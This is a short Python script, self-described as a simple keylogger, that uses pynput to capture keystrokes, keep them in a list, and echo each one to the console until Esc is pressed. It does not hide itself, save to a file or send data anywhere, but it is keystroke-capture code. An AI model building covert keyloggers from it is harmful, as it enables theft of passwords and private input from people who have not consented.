from pynput.keyboard import Key, Listener
import colorama
from colorama import Fore


colorama.just_fix_windows_console()

print(Fore.RED + '77KGMZ\'s Simple Python Keylogger')

keys = []


def on_press(key):
    global keys
    keys.append(key)
    print(Fore.RED + "{0} Pressed!".format(key))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
